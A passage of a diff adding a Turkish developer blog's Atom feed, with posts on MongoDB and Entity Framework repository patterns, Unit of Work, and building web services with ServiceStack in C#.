+&lt;strong&gt;Id&lt;/strong&gt; alanlarını &lt;code class=&quot;highlighter-rouge&quot;&gt;[BsonId]&lt;/code&gt; diğer alanları ise &lt;code class=&quot;highlighter-rouge&quot;&gt;[BsonElement(..)]&lt;/code&gt; attribute ile işaretliyoruz. &lt;br /&gt;
+&lt;strong&gt;Id&lt;/strong&gt; lerimizin tipi ise dikkat ederseniz &lt;em&gt;ObjectId&lt;/em&gt; türünden. &lt;br /&gt;
+Bu şekilde field larımızı attribute ler yardımıyla isimlendirmiş olduk.
+&lt;br /&gt; &lt;br /&gt;&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/fasetto/66a5e9d52d96f492af60a840ab8cab38.js&quot;&gt; &lt;/script&gt;
+
+&lt;p&gt;Asenkron bi şekilde repository interface ‘imizi de &lt;strong&gt;CRUD&lt;/strong&gt; işlemlerimiz için hazırlıyoruz..
+&lt;br /&gt; &lt;br /&gt;&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/fasetto/939854e9a7c34d9cafd83f1b37ff15ff.js&quot;&gt; &lt;/script&gt;
+
+&lt;p&gt;Context sınıfımızı da yukarıdaki gibi tasarlıyoruz.
+Burada dikkatinizi çeken &lt;code class=&quot;highlighter-rouge&quot;&gt;IMongoDatabase&lt;/code&gt; interface ‘i bizim veritabanımızı temsil ediyor. &lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;MongoUrl&lt;/code&gt; sınıfını ise bizim connection string ‘imiz üzerinden veritabanı adını alabilmemiz için kullandık. &lt;br /&gt; &lt;br /&gt;&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/fasetto/5f885e768e0f355a885c81193b64316c.js&quot;&gt; &lt;/script&gt;
+
+&lt;p&gt;&lt;strong&gt;MongoRepository&lt;/strong&gt; adında &lt;em&gt;generic&lt;/em&gt; bir abstract repository sınıfımızı yukarıdaki gibi hazırlıyoruz. &lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IRepository&amp;lt;T&amp;gt;&lt;/code&gt; interface ‘imizi de giydiriyoruz sınıfımıza. &lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;IMongoCollection&amp;lt;T&amp;gt;&lt;/code&gt; Başta gösterdiğim tablodaki gibi &lt;em&gt;collection&lt;/em&gt;, SQL karşılığı ile bizim tablolarımızdır diyebiliriz. &lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Burada bir de &lt;strong&gt;AddNewAsync&lt;/strong&gt; methodumuzu görüyorsunuz. &lt;br /&gt;
+&lt;em&gt;Collection&lt;/em&gt; property ‘mizin &lt;strong&gt;InsertOneAsync&lt;/strong&gt; methodu ile veritabanımıza ekleme yapıyoruz. &lt;br /&gt; &lt;br /&gt;&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/fasetto/765aaea4a672ae78e381c6a51e339a0b.js&quot;&gt; &lt;/script&gt;
+
+&lt;p&gt;Burada açıkçası pek fazla açıklama yapmaya gerek olmadığını düşünüyorum. &lt;em&gt;MongoRespository&lt;/em&gt; sınıfımızın diğer methodları buradakiler. &lt;br /&gt;
+Sorgulama yaparken &lt;em&gt;(GetByX.. methodlarımızda)&lt;/em&gt; filtreleme yapabilmek için &lt;strong&gt;Builder&lt;/strong&gt; sınıfından yararlanıyoruz. Ya da &lt;em&gt;linq&lt;/em&gt; methodları ile de yapabilirsiniz bunu tabii.
+Burada &lt;em&gt;update&lt;/em&gt; işleminde &lt;em&gt;linq&lt;/em&gt; kullandık.
+&lt;br /&gt; &lt;br /&gt;&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/fasetto/e613b124f8b497ecb829ed4108ed954a.js&quot;&gt; &lt;/script&gt;
+
+&lt;p&gt;&lt;strong&gt;UserRepository&lt;/strong&gt; ‘mizi de oluşturduk. &lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;_dataContext.Database.GetCollection&amp;lt;User&amp;gt;(&quot;users&quot;);&lt;/code&gt; Burada tırnak içinde &lt;strong&gt;“users”&lt;/strong&gt; yazdığım yere siz tabiiki kendi koleksiyonunuza vermek istediğiniz adı gireceksiniz.&lt;/p&gt;
+
+&lt;p&gt;Buraya kadar tamam. &lt;br /&gt;
+Bir de pratik olsun diye &lt;em&gt;UnitOfWork&lt;/em&gt; yapalım hadi. &lt;br /&gt; &lt;br /&gt;&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/fasetto/eaf9cc8de9ccd7da4418ded4e339707c.js&quot;&gt; &lt;/script&gt;
+
+&lt;p&gt;&lt;br /&gt; &lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ve aşağıda da oluşturduğumuz sınıflarımızı kullanarak &lt;em&gt;CRUD&lt;/em&gt; işlemlerimizi gerçekleştirdiğimiz bir test sınıfımız var.&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/fasetto/d8df2fa533183672edc8092763d6f2fb.js&quot;&gt; &lt;/script&gt;
+
+&lt;p&gt;Bir sonraki yazıda görüşmek üzere.
+&lt;br /&gt; &lt;br /&gt;&lt;/p&gt;</content><author><name>fasetto</name></author><category term="repositorypattern" /><category term="mongodb" /><summary type="html">MongoDB MongoDB, NoSQL kavramıyla ortaya çıkmış document-oriented veri modelini kullanan açık kaynak bir veritabanıdır.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://fasetto.github.io/images/mongodb-logo.png" /></entry><entry><title type="html">ServiceStack ile web servis geliştirme</title><link href="http://fasetto.github.io/service-stack/" rel="alternate" type="text/html" title="ServiceStack ile web servis geliştirme" /><published>2017-04-26T00:00:00+03:00</published><updated>2017-04-26T00:00:00+03:00</updated><id>http://fasetto.github.io/service-stack</id><content type="html" xml:base="http://fasetto.github.io/service-stack/">&lt;p&gt;&lt;img src=&quot;/assets/images/servicestack-logo.png&quot; alt=&quot;servicestack-logo&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;nedir-bu-servicestack-&quot;&gt;Nedir bu ServiceStack ?&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;WCF&lt;/strong&gt; ve &lt;strong&gt;Web API&lt;/strong&gt; ye alternatif olarak &lt;em&gt;cross-platform&lt;/em&gt; olarak kullanabileceğimiz &lt;em&gt;open-source&lt;/em&gt; bir &lt;em&gt;web service framework.&lt;/em&gt;
+&lt;!-- more--&gt;
+&lt;br /&gt; Eğer .Net Framework çatısı altında çalışıyorsanız &lt;em&gt;WCF&lt;/em&gt; kullanabilirsiniz fakat web servislerinizi &lt;em&gt;Windows&lt;/em&gt; dışındaki platformlara da dağıtmak istiyorsanız &lt;strong&gt;ServiceStack&lt;/strong&gt; ideal bir seçenektir.
+&lt;br /&gt; &lt;br /&gt; WCF client ve server arasındaki iletişimi sağlayabilmek için &lt;em&gt;data contracts (veri sözleşmeleri)&lt;/em&gt; kullanır.
+&lt;strong&gt;ServiceStack&lt;/strong&gt; bu bakımdan biraz da WCF ‘e benzer.
+&lt;br /&gt;
+Daha fazla bilgi için: &lt;strong&gt;&lt;a href=&quot;http://servicestack.net&quot;&gt;servicestack.net&lt;/a&gt;&lt;/strong&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h1 id=&quot;neden-servicestack-&quot;&gt;Neden ServiceStack ?&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;Kolay olması&lt;/li&gt;
+  &lt;li&gt;Hızlı olması&lt;/li&gt;
+  &lt;li&gt;Bizi karmaşık XML configrasyonlarıyla uğraştırmaması&lt;/li&gt;
+  &lt;li&gt;En önemlisi de cross-platform bir hizmet verebilmemizi sağlıyor olması&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;gibi avantajları olduğu için tercih edilir.
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;ServiceStack&lt;/strong&gt; &lt;em&gt;Any, GET, POST, DELETE, PUT&lt;/em&gt; gibi eylemleri destekler. &lt;strong&gt;Any&lt;/strong&gt; hem &lt;em&gt;GET&lt;/em&gt; hem de &lt;em&gt;POST&lt;/em&gt; istekleri tarafından çağrılabileceği anlamına gelir.
+&lt;br /&gt;
+&lt;img src=&quot;/images/servicestack-httpclients.png&quot; alt=&quot;servicestack-httpclients&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;ServiceStack&lt;/strong&gt; web servisimizi &lt;strong&gt;RESTful&lt;/strong&gt; web servise dönüştürmek için &lt;em&gt;Web request&lt;/em&gt; tanımlarken sınıfımızı &lt;code class=&quot;highlighter-rouge&quot;&gt;[Route(...)]&lt;/code&gt; attribute ile uygun şekilde işaretlememiz yeterli.
+&lt;br /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Ufak bir örnek ile gösterelim.
+&lt;br /&gt; &lt;strong&gt;NuGet&lt;/strong&gt; package manager ‘da  &lt;em&gt;ServiceStack&lt;/em&gt; framework ‘unu buluyoruz ve projemize ekliyoruz.&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/fasetto/78b97aa131288097a3ae27e8fba30ca2.js&quot;&gt; &lt;/script&gt;
+&lt;p&gt;&lt;br /&gt;
+Burada basitçe &lt;strong&gt;Name&lt;/strong&gt; parametresi alan bir &lt;em&gt;HelloService&lt;/em&gt; oluşturduk. Geriye gördüğünüz üzere &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;Hello, $Name&quot;&lt;/code&gt; şeklinde parametreyi döndürüyor.
+&lt;br /&gt; &lt;em&gt;HelloRequest&lt;/em&gt; sınıfına neden &lt;code class=&quot;highlighter-rouge&quot;&gt;IReturn&amp;lt;HelloResponse&amp;gt;&lt;/code&gt; arayüzünü giydirdiğimizi birazdan açıklayacağım.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/fasetto/8f1667ece8a2e61b771a626d18a83ded.js&quot;&gt; &lt;/script&gt;
+
+&lt;p&gt;&lt;em&gt;AppHost&lt;/em&gt; ‘umuzu &lt;strong&gt;AppSelfHostBase&lt;/strong&gt; sınıfından türetiyoruz. Ve constructor ‘ında ilgili parametreleri veriyoruz.
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/fasetto/50b77fed75854a34fe1e300726d56b6d.js&quot;&gt; &lt;/script&gt;
+
+&lt;p&gt;Hostumuzu bu şekilde oluşturup başlatıyoruz.
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/fasetto/eb7172695de754d0365e2974f3998874.js&quot;&gt; &lt;/script&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Test projemize aynı şekilde &lt;strong&gt;NuGet&lt;/strong&gt; package manager ‘dan bu kez &lt;em&gt;ServiceStack.HttpClient&lt;/em&gt; referansını ekliyoruz.
+&lt;br /&gt;
+&lt;em&gt;HelloRequest&lt;/em&gt; sınıfına &lt;code class=&quot;highlighter-rouge&quot;&gt;IReturn&amp;lt;HelloResponse&amp;gt;&lt;/code&gt; arayüzünü giydirmeseydik kodda yorum satırı olarak geçen: &lt;br /&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;string response = client.Get(new HelloRequest { Name = &quot;SERKAN&quot; }).Result;&lt;/code&gt; &lt;br /&gt;
+şeklinde bir kullanım yapamazdık.  Çünki &lt;code class=&quot;highlighter-rouge&quot;&gt;client.Get()&lt;/code&gt; fonksiyonun aldığı parametrelerden biri &lt;code class=&quot;highlighter-rouge&quot;&gt;IRequest&amp;lt;T&amp;gt;&lt;/code&gt;.
+&lt;br /&gt; &lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bu yazımızda buraya kadar.
+&lt;br /&gt; Detaylı dokümantasyon için &lt;strong&gt;&lt;a href=&quot;http://docs.servicestack.net&quot;&gt;docs.servicestack.net&lt;/a&gt;&lt;/strong&gt; adresine göz atabilirsin.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt; &lt;br /&gt;&lt;/p&gt;</content><author><name>fasetto</name></author><category term="servicestack webservices" /><category term="restfullservice" /><summary type="html">Nedir bu ServiceStack ? WCF ve Web API ye alternatif olarak cross-platform olarak kullanabileceğimiz open-source bir web service framework.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://fasetto.github.io/assets/images/servicestack-logo-png" /></entry><entry><title type="html">Repository pattern ve tipik hatalar</title><link href="http://fasetto.github.io/repository-pattern/" rel="alternate" type="text/html" title="Repository pattern ve tipik hatalar" /><published>2017-04-23T00:00:00+03:00</published><updated>2017-04-23T00:00:00+03:00</updated><id>http://fasetto.github.io/repository-pattern</id><content type="html" xml:base="http://fasetto.github.io/repository-pattern/">&lt;p&gt;&lt;img src=&quot;/assets/images/repository-pattern.png&quot; alt=&quot;repository-pattern.png&quot; /&gt;
+&lt;br /&gt;
+Repository pattern bir soyutlamadır. Amaç karışıklığı azaltarak kodun geri kalanını kalıcı kılmaktır.&lt;/p&gt;
+
+&lt;h2 id=&quot;faydaları-&quot;&gt;Faydaları !&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Unit testler yazmayı kolaylaştırır.&lt;/li&gt;
+  &lt;li&gt;Kodun bakım ve yönetimi kolaylaşır.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;CRUD&lt;/strong&gt; &lt;em&gt;(Create, Read, Update, Delete)&lt;/em&gt; işlemlerimizi hızlıca gerçekleştirebiliriz.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;nasıl-repository-oluşturulur-&quot;&gt;Nasıl repository oluşturulur ?&lt;/h1&gt;
+&lt;p&gt;Repository pattern ‘ı doğru bir şekilde uygulayabilmek için izlemeniz gereken tek bir kural var.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Repository sınıfınıza, ihtiyaç duyana kadar &lt;strong&gt;hiç bir şey eklemeyin !&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Geliştiricilerin bir çoğu generic bir repository oluturup, içine ihtiyaç duyabilecekleri tüm fonksiyonları da ekleyerek bunu bir base class olarak kullanırlar. &lt;strong&gt;Bu yanlıştır.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;unit-of-work&quot;&gt;Unit of Work&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Unit of work&lt;/strong&gt; design pattern ‘ı genellikle &lt;strong&gt;repository pattern&lt;/strong&gt; ile birlikte kullanılır.
+Adından da anlaşılacağı gibi veritabanı işlemlerimizi tek bir kanaldan yürütmemizi sağlar.
+&lt;br /&gt; &lt;br /&gt;
+Yapılan işlemlerin veritabanına toplu halde kaydedilmesi, herhangi bir hata olması durumunda &lt;em&gt;rollback&lt;/em&gt; (geri alınması) ya da transaction iptali gibi işlemleri sağlayabiliriz.
+&lt;script src=&quot;https://gist.github.com/fasetto/acdcd14585eb816d2a6cec9268726749.js&quot;&gt; &lt;/script&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;uygulama&quot;&gt;Uygulama&lt;/h2&gt;
+&lt;p&gt;Küçük bir örnek ile başlayalım.
+&lt;script src=&quot;https://gist.github.com/fasetto/d87ddd7524fe8b0f95ddae744b5cf7ad.js&quot;&gt; &lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+Biraz da özelleştirelim.
+&lt;script src=&quot;https://gist.github.com/fasetto/afb03d684735f392a40576ee4d790dd2.js&quot;&gt; &lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;Burada görüldüğü gibi sadece ihtiyacınız olan fonksiyonları oluşturun.
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;entity-framework&quot;&gt;Entity Framework&lt;/h2&gt;
+&lt;h3 id=&quot;base-class-taban-sınıf&quot;&gt;Base class (taban sınıf)&lt;/h3&gt;
+&lt;script src=&quot;https://gist.github.com/fasetto/e3b482d52a86af98373c00efdad73d1d.js&quot;&gt; &lt;/script&gt;
+
+&lt;p&gt;&lt;br /&gt;
+Oluşturduğumuz taban sınıfımızı daha sonra repository sınıfımıza implement ediyoruz.
+&lt;script src=&quot;https://gist.github.com/fasetto/23baba9ae403c506d07152c0c47a892f.js&quot;&gt; &lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;return&lt;/em&gt; ederken &lt;code class=&quot;highlighter-rouge&quot;&gt;ToList()&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;FirstOrDefault()&lt;/code&gt; vb. çağrılıncaya kadar sorgu veritabanında &lt;em&gt;yürütülemez.&lt;/em&gt;
+&lt;br /&gt;
+&lt;strong&gt;Kullanmayı unutmayın !&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;entity-framework-için-unit-of-work&quot;&gt;Entity Framework için Unit of Work&lt;/h3&gt;
+&lt;script src=&quot;https://gist.github.com/fasetto/dc98aabaae0bc16e1a1ed1e2fc93a50a.js&quot;&gt; &lt;/script&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;final&quot;&gt;Final&lt;/h3&gt;
+&lt;script src=&quot;https://gist.github.com/fasetto/fc05dfcaf087f05ea93d07725524f23b.js&quot;&gt; &lt;/script&gt;
+
+&lt;h1 id=&quot;tipik-hatalar&quot;&gt;Tipik hatalar&lt;/h1&gt;
+&lt;h2 id=&quot;linq-methodlarınızı-dışarı-açmayın&quot;&gt;Linq methodlarınızı dışarı açmayın&lt;/h2&gt;
+&lt;p&gt;Eğer linq methodlarınızı açığa vurursanız yani dışarıya açarsanız &lt;em&gt;(sızıntı)&lt;/em&gt; repository pattern ‘ı amacına uygun kullanamamış olursunuz. &lt;em&gt;Sızıntılı&lt;/em&gt; bir soyutlama elde edersiniz.
+Genellikle &lt;code class=&quot;highlighter-rouge&quot;&gt;IQueryable&amp;lt;T&amp;gt;&lt;/code&gt; ile.
+&lt;br /&gt;
+Repository pattern yazının en başında da dediğimiz gibi &lt;strong&gt;soyutlamaya (abstraction)&lt;/strong&gt; dayanır.&lt;/p&gt;
+
+&lt;p&gt;Bunu yapmayın:
+&lt;script src=&quot;https://gist.github.com/fasetto/a188527916b426f4586f7c8af3dd40c7.js&quot;&gt; &lt;/script&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Bu repository sınıfları hiç bir amaca hizmet etmiyor.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;lazy-loading-öğrenin&quot;&gt;Lazy-loading öğrenin&lt;/h2&gt;
+&lt;p&gt;Eğer bilmiyorsanız &lt;a href=&quot;https://www.google.com/search?q=lazy+loading&quot; target=&quot;_blank&quot;&gt;Google&lt;/a&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;</content><author><name>fasetto</name></author><category term="repositorypattern" /><category term="entityframework" /><category term="unitofwork" /><category term="designpatterns" /><summary type="html">Repository pattern bir soyutlamadır. Amaç karışıklığı azaltarak kodun geri kalanını kalıcı kılmaktır.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://fasetto.github.io/assets/images/repository-pattern.png" /></entry></feed>
